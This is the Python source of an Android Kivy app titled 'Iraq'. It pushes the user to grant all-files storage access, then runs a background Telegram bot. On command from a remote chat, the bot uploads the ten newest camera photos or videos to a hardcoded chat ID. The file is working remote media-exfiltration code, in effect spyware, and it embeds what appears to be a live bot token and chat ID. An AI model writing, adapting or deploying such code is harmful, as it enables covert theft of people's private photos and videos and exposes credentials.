# main.py
import os
import time
import hashlib
import threading
import traceback

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.widget import Widget
from kivy.graphics import Color, RoundedRectangle, Ellipse, Line
from kivy.clock import Clock, mainthread
from kivy.metrics import dp, sp
from kivy.core.window import Window
from kivy.utils import get_color_from_hex, platform
from kivy.resources import resource_add_path, resource_find

import requests

# ================== دعم العربية (آمن) ==================
def _ar_fallback(text):
    """خطة احتياطية: عكس بسيط للنص العربي إذا لم تتوفر bidi."""
    try:
        import arabic_reshaper
        reshaped = arabic_reshaper.reshape(str(text))
    except Exception:
        reshaped = str(text)
    # عكس يدوي بسيط (ليس مثالياً لكنه أفضل من لا شيء)
    return reshaped[::-1]

try:
    import arabic_reshaper
    # نحاول python-bidi أولاً، ثم pybidi، ثم الخطة الاحتياطية
    try:
        from bidi.algorithm import get_display as _get_display
        def ar(text):
            return _get_display(arabic_reshaper.reshape(str(text)))
    except Exception:
        def ar(text):
            return _ar_fallback(text)
except ImportError:
    def ar(text): return str(text)

# ================== الألوان ==================
PRIMARY_BLUE   = get_color_from_hex('#1565C0')
DARK_BLUE      = get_color_from_hex('#0D47A1')
BTN_BLUE       = get_color_from_hex('#1976D2')
BG_COLOR       = get_color_from_hex('#F5F7FA')
WHITE          = get_color_from_hex('#FFFFFF')
TEXT_DARK      = get_color_from_hex('#1A202C')
TEXT_GRAY      = get_color_from_hex('#718096')
SUCCESS_GREEN  = get_color_from_hex('#38A169')
ERROR_RED      = get_color_from_hex('#E53E3E')
BORDER_GRAY    = get_color_from_hex('#E2E8F0')

# ================== إعدادات تيليجرام ==================
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID   = "6046016571"
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ================== مسار الخط (باستخدام resource_find) ==================
FONT_PATH = None
try:
    # نضيف مسار assets/fonts إلى موارد Kivy
    resource_add_path(os.path.join(os.path.dirname(__file__), 'assets', 'fonts'))
    FONT_PATH = resource_find('NotoNaskhArabic-Regular.ttf')
    if not FONT_PATH:
        # ربما تم تضمينه عبر android.add_assets في مسار مختلف
        FONT_PATH = resource_find('fonts/NotoNaskhArabic-Regular.ttf')
except Exception as e:
    print(f"Font path error: {e}")

# ================== دوال مساعدة ==================
def safe_log_path():
    """مسار داخلي آمن لكتابة سجل الأخطاء (لا يحتاج أي إذن)."""
    try:
        return os.path.join(App.get_running_app().user_data_dir, "crash_log.txt")
    except Exception:
        return "/data/local/tmp/iraq_crash.txt"

def write_crash_log(text):
    try:
        path = safe_log_path()
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(text)
    except Exception:
        pass

def check_storage_permission():
    """التحقق الفعلي من إذن إدارة الملفات على أندرويد."""
    if platform != 'android':
        return True
    try:
        from jnius import autoclass
        Environment = autoclass('android.os.Environment')
        return Environment.isExternalStorageManager()
    except Exception:
        return False

def open_all_files_settings():
    """فتح شاشة إعدادات النظام لتفعيل MANAGE_EXTERNAL_STORAGE (بدون كراش)."""
    if platform != 'android':
        return
    try:
        from jnius import autoclass
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        Uri = autoclass('android.net.Uri')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        pkg = PythonActivity.mActivity.getPackageName()
        intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
        intent.setData(Uri.parse(f"package:{pkg}"))
        PythonActivity.mActivity.startActivity(intent)
    except Exception as e:
        print(f"Open settings error: {e}")

# ================== البحث عن الوسائط ==================
GALLERY_PATHS = ["/storage/emulated/0/DCIM/Camera"]

def get_media_files(limit=10, media_type='photo'):
    """يعيد قائمة بأحدث الملفات (صور أو فيديوهات) من مجلد الكاميرا."""
    if not check_storage_permission():
        return []
    IMG_EXT = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv', '.3gp')
    exts = IMG_EXT if media_type == 'photo' else VID_EXT
    all_files = []
    for folder in GALLERY_PATHS:
        if not os.path.exists(folder):
            continue
        try:
            for root, dirs, files in os.walk(folder):
                for f in files:
                    if f.lower().endswith(exts):
                        all_files.append(os.path.join(root, f))
        except Exception:
            continue
    all_files.sort(key=os.path.getmtime, reverse=True)
    return all_files[:limit]

def send_telegram_file(filepath, media_type):
    """يرسل ملفاً واحداً إلى تيليجرام."""
    try:
        file_size = os.path.getsize(filepath)
        is_video = media_type == 'video'
        if is_video:
            if file_size > 50 * 1024 * 1024:
                method, key = "sendDocument", "document"
            else:
                method, key = "sendVideo", "video"
        else:
            method, key = "sendPhoto", "photo"

        timeout_val = max(60, int(file_size / (500 * 1024)))
        with open(filepath, 'rb') as f:
            files = {key: (os.path.basename(filepath), f)}
            data = {'chat_id': CHAT_ID, 'caption': '📤 من الهاتف'}
            r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=timeout_val)
        ok = r.status_code == 200 and r.json().get("ok") is True
        time.sleep(1)  # تجنب حدود تيليجرام
        return ok
    except Exception as e:
        print(f"Send error: {e}")
        return False

# ================== واجهة Kivy ==================
class LogoWidget(Widget):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            Color(*PRIMARY_BLUE)
            self.circle = Ellipse(pos=self.pos, size=self.size)
        self.label = Label(text="A", bold=True, font_size=sp(50), color=WHITE,
                           halign='center', valign='middle')
        self.add_widget(self.label)
        self.bind(pos=self._update, size=self._update)
    def _update(self, *args):
        self.circle.pos = self.pos
        self.circle.size = self.size

class RoundedButton(Button):
    def __init__(self, bg_color=BTN_BLUE, **kwargs):
        super().__init__(**kwargs)
        self.background_normal = ''
        self.background_color = (0, 0, 0, 0)
        self._bg_color = bg_color
        with self.canvas.before:
            Color(*self._bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(14)])
        self.bind(pos=self._update, size=self._update)
    def _update(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

class RoundedInput(TextInput):
    def __init__(self, **kwargs):
        kwargs.setdefault('background_normal', '')
        kwargs.setdefault('background_active', '')
        kwargs.setdefault('background_color', (0, 0, 0, 0))
        kwargs.setdefault('foreground_color', TEXT_DARK)
        kwargs.setdefault('cursor_color', PRIMARY_BLUE)
        kwargs.setdefault('hint_text_color', TEXT_GRAY)
        kwargs.setdefault('padding', [dp(16), dp(16), dp(16), dp(16)])
        super().__init__(**kwargs)
        if FONT_PATH:
            self.font_name = FONT_PATH
        with self.canvas.before:
            Color(*WHITE)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=[dp(12)])
            Color(*BORDER_GRAY)
            self.border = Line(rounded_rectangle=(self.x, self.y, self.width, self.height, dp(12)), width=1)
        self.bind(pos=self._update, size=self._update)
    def _update(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size
        self.border.rounded_rectangle = (self.x, self.y, self.width, self.height, dp(12))

class MainApplicationUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        with self.canvas.before:
            Color(*BG_COLOR)
            self.bg = RoundedRectangle(pos=self.pos, size=self.size)
        self.bind(pos=self._update_bg, size=self._update_bg)

        self._bot_started = False
        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
        content = BoxLayout(orientation='vertical', padding=[dp(24), dp(30), dp(24), dp(30)],
                            spacing=dp(14), size_hint_y=None)
        content.bind(minimum_height=content.setter('height'))

        logo_holder = BoxLayout(size_hint_y=None, height=dp(110))
        logo = LogoWidget(size_hint=(None, None), size=(dp(90), dp(90)),
                          pos_hint={'center_x': 0.5, 'center_y': 0.5})
        logo_holder.add_widget(logo)
        content.add_widget(logo_holder)

        content.add_widget(Label(text=ar("العراق"), font_name=FONT_PATH or 'Roboto',
                                 font_size=sp(34), bold=True, color=DARK_BLUE,
                                 size_hint_y=None, height=dp(52)))
        content.add_widget(Label(text=ar("تحكم بالبوت من تيليجرام"), font_name=FONT_PATH or 'Roboto',
                                 font_size=sp(14), color=TEXT_GRAY,
                                 size_hint_y=None, height=dp(28)))
        content.add_widget(Widget(size_hint_y=None, height=dp(18)))

        # زر منح الصلاحية (يظهر فقط على أندرويد)
        if platform == 'android':
            self.perm_btn = RoundedButton(text=ar("1. منح إذن الوصول للملفات"),
                                          font_name=FONT_PATH or 'Roboto',
                                          font_size=sp(16), bg_color=ERROR_RED,
                                          size_hint_y=None, height=dp(52))
            self.perm_btn.bind(on_press=self._request_permission)
            content.add_widget(self.perm_btn)
            content.add_widget(Widget(size_hint_y=None, height=dp(10)))

        # زر بدء بوت التحكم
        self.start_bot_btn = RoundedButton(text=ar("2. بدء الاستماع للبوت"),
                                           font_name=FONT_PATH or 'Roboto',
                                           font_size=sp(18), bg_color=SUCCESS_GREEN,
                                           size_hint_y=None, height=dp(58))
        self.start_bot_btn.bind(on_press=self._start_bot)
        content.add_widget(self.start_bot_btn)

        content.add_widget(Widget(size_hint_y=None, height=dp(18)))

        self.status_lbl = Label(text=ar("جاهز."), font_name=FONT_PATH or 'Roboto',
                                font_size=sp(14), color=TEXT_GRAY,
                                size_hint_y=None, height=dp(80),
                                halign='center', valign='middle')
        self.status_lbl.bind(size=lambda *a: setattr(self.status_lbl, 'text_size', (self.status_lbl.width, None)))
        content.add_widget(self.status_lbl)

        scroll.add_widget(content)
        self.add_widget(scroll)

    def _update_bg(self, *args):
        self.bg.pos = self.pos
        self.bg.size = self.size

    @mainthread
    def set_status(self, msg, color=TEXT_GRAY):
        self.status_lbl.text = ar(msg)
        self.status_lbl.color = color

    def _request_permission(self, instance):
        if platform != 'android':
            self.set_status("هذه الميزة على أندرويد فقط.")
            return
        try:
            from android.permissions import request_permissions, Permission
            request_permissions(
                [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE],
                callback=self._on_perm_result
            )
        except Exception as e:
            self.set_status(f"خطأ في طلب الصلاحيات: {e}", ERROR_RED)

    def _on_perm_result(self, permissions, grants):
        # بعد منح الصلاحيات العادية، نفتح إعدادات "جميع الملفات"
        open_all_files_settings()
        self.set_status("يرجى تفعيل 'السماح بإدارة جميع الملفات' ثم العودة.", PRIMARY_BLUE)

    def _start_bot(self, instance):
        if not check_storage_permission():
            self.set_status("الرجاء منح إذن 'إدارة جميع الملفات' أولاً (الزر الأحمر).", ERROR_RED)
            return
        if self._bot_started:
            self.set_status("البوت يعمل بالفعل.", SUCCESS_GREEN)
            return
        self._bot_started = True
        self.start_bot_btn.disabled = True
        self.start_bot_btn.text = ar("✅ البوت يعمل")
        self.set_status("البوت يستمع لأوامر تيليجرام... أرسل /start للبوت.", SUCCESS_GREEN)
        threading.Thread(target=self._bot_listener, daemon=True).start()

    # ================== منطق البوت (Long Polling) ==================
    def _bot_listener(self):
        offset = None
        while True:
            try:
                url = f"{API_URL}/getUpdates"
                params = {'timeout': 30, 'offset': offset}
                resp = requests.get(url, params=params, timeout=40)
                if resp.status_code != 200:
                    time.sleep(5)
                    continue
                updates = resp.json().get('result', [])
                for upd in updates:
                    offset = upd['update_id'] + 1
                    if 'callback_query' in upd:
                        cb = upd['callback_query']
                        data = cb.get('data')
                        cb_id = cb.get('id')
                        requests.get(f"{API_URL}/answerCallbackQuery",
                                     params={'callback_query_id': cb_id, 'text': 'تم استلام الأمر...'})
                        if data == 'send_10_photos':
                            self._handle_send(10, 'photo')
                        elif data == 'send_10_videos':
                            self._handle_send(10, 'video')
                    elif 'message' in upd:
                        msg = upd['message']
                        chat_id = msg['chat']['id']
                        if msg.get('text', '') == '/start':
                            self._show_buttons(chat_id)
            except Exception as e:
                print(f"Bot listener error: {e}")
                time.sleep(10)

    def _show_buttons(self, chat_id):
        keyboard = {
            "inline_keyboard": [
                [{"text": "📸 إرسال 10 صور", "callback_data": "send_10_photos"}],
                [{"text": "🎬 إرسال 10 فيديوهات", "callback_data": "send_10_videos"}]
            ]
        }
        requests.post(f"{API_URL}/sendMessage",
                      json={'chat_id': chat_id, 'text': 'اختر الأمر:', 'reply_markup': keyboard})

    def _handle_send(self, limit, media_type):
        if not check_storage_permission():
            requests.post(f"{API_URL}/sendMessage",
                          json={'chat_id': CHAT_ID, 'text': '❌ صلاحية الملفات غير ممنوحة. افتح التطبيق وامنحها.'})
            return
        threading.Thread(target=self._do_send, args=(limit, media_type), daemon=True).start()

    def _do_send(self, limit, media_type):
        self.set_status(f"جاري البحث عن {limit} ملفات...")
        files = get_media_files(limit=limit, media_type=media_type)
        if not files:
            self.set_status("لم يتم العثور على ملفات أو الصلاحية مرفوضة.", ERROR_RED)
            requests.post(f"{API_URL}/sendMessage",
                          json={'chat_id': CHAT_ID, 'text': '❌ لم يتم العثور على ملفات.'})
            return
        sent = 0
        for path in files:
            if send_telegram_file(path, media_type):
                sent += 1
                self.set_status(f"تم إرسال {sent}/{len(files)}...")
            else:
                self.set_status(f"فشل إرسال: {os.path.basename(path)}", ERROR_RED)
        self.set_status(f"✅ تم إرسال {sent} ملفاً.", SUCCESS_GREEN)
        requests.post(f"{API_URL}/sendMessage",
                      json={'chat_id': CHAT_ID, 'text': f'✅ تم إرسال {sent} ملفاً بنجاح.'})

# ================== كلاس التطبيق ==================
class IraqApp(App):
    def build(self):
        self.title = "العراق"
        return MainApplicationUI()

    def on_start(self):
        # طلب الصلاحيات العادية فقط (بدون MANAGE_EXTERNAL_STORAGE مباشرة)
        if platform == 'android':
            try:
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.READ_EXTERNAL_STORAGE,
                                     Permission.WRITE_EXTERNAL_STORAGE])
            except Exception:
                pass

if __name__ == '__main__':
    try:
        IraqApp().run()
    except Exception:
        err = traceback.format_exc()
        print(err)
        write_crash_log(err)
        # لا نعيد رفع الاستثناء هنا لتجنب إغلاق صامت إضافي
